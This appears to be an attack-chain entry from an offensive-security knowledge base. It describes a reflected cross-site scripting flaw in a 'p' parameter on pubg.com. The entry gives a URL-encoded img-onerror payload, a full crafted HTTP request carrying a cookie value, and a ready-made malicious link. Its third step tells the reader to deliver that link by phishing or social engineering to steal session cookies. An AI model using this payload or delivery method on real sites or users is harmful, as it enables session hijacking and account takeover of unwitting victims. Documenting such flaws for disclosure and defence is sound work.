---
id: ac-reflected-xss-pubg-751870
tags:
  - xss
  - reflected-xss
  - javascript
  - cookie-theft
  - web-vulnerability
type: attack_chain
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Prepare-XSS-JavaScript-Payload]]'
  - '[[procedures/Inject-Payload-into-Vulnerable-Parameter]]'
  - '[[procedures/Deliver-Malicious-URL-to-Victim]]'
step_count: 3
techniques:
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
updated_at: '2025-12-13T23:55:37.984Z'
description: >-
  A multi-stage attack exploiting a reflected XSS vulnerability in the 'p' GET
  parameter on pubg.com to inject JavaScript and steal user cookies.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Steal Web Session Cookie]]'
---
# Reflected XSS in PUBG.com Parameter Leading to Cookie Theft

Multi-stage attack chain demonstrating a complete reflected XSS workflow on pubg.com, allowing arbitrary JavaScript execution in a victim's browser to steal session cookies and perform actions on their behalf.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Prepare Payload] --> B[Inject into Parameter]
    B --> C[Deliver to Victim]
    C --> D[Execute and Exfil]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- None (manual crafting and browser-based testing)

### Target Environment

- Web platform
- Target: https://www.pubg.com/
- Vulnerable endpoint: GET parameter 'p'
- No specific ports or services required beyond HTTP/HTTPS access

### Initial Access Requirements

- Public access to pubg.com
- Ability to craft and send URLs (e.g., via email or link sharing)
- Victim interaction required (clicking the malicious link)

## Detailed Attack Procedures

### Step 1: Prepare XSS Payload
procedure: [[procedures/Prepare-XSS-JavaScript-Payload]]

**Objective**: Create a simple JavaScript payload to demonstrate XSS by alerting the victim's cookies.

**Instructions**: Develop the payload using basic JavaScript to access and display document cookies.

Execute [[commands/alert-document-cookie]] in the payload context:

```javascript
alert(document.cookie);
```

**Expected Output**: When executed in a browser, an alert box displays the victim's cookie values.

**Success Indicators**:
- Payload syntax validated (no errors in a test environment)
- Ready for injection into URL parameter

### Step 2: Inject Payload into Vulnerable Parameter
procedure: [[procedures/Inject-Payload-into-Vulnerable-Parameter]]

**Objective**: Encode and inject the payload into the 'p' GET parameter to form a malicious HTTP request.

**Instructions**: URL-encode the payload and append it to the vulnerable endpoint. Simulate the request with browser headers.

Use [[commands/crafted-get-request-xss]] to send the request:

```http
GET /?p=iqz78'%3e%3cimg%20src%3da%20onerror%3dalert(document.cookie)%3d1%3echplq HTTP/1.1
Host: www.pubg.com
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Referer: https://www.pubg.com/es/feed/
Cookie: _icl_current_language=en; _icl_visitor_lang_js=en-us; wpml_browser_redirect_test=0; __cfduid=de74423d435717d651b1c9e2c63f4acc21575460678
```

**Expected Output**: The server reflects the unsanitized input, embedding the script in the response page.

**Success Indicators**:
- Payload reflected in page source without sanitization
- No server-side errors blocking the injection

### Step 3: Deliver Malicious URL to Victim
procedure: [[procedures/Deliver-Malicious-URL-to-Victim]]

**Objective**: Trick the victim into visiting the malicious URL, triggering the XSS execution.

**Instructions**: Share the crafted URL (e.g., https://www.pubg.com/?p=iqz78'%3e%3cimg%20src%3da%20onerror%3dalert(document.cookie)%3d1%3echplq) via phishing email, social engineering, or direct link.

No specific command; monitor for victim access.

**Expected Output**: Upon visit, the injected script executes, alerting cookies in the victim's browser.

**Success Indicators**:
- Victim clicks the link
- JavaScript executes (e.g., alert popup or observed exfiltration)

## Attack Chain Summary

### Key Achievements

1. Successful payload preparation and injection into unsanitized 'p' parameter
2. Reflection of malicious script in server response
3. Arbitrary JavaScript execution in victim browser, enabling cookie theft and session hijacking

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]
- [[Steal Web Session Cookie]]

### MITRE ATT&CK Tactics

- [[Execution]]
- [[Collection]]

---
*Last updated: 2023-10-01T00:00:00Z*
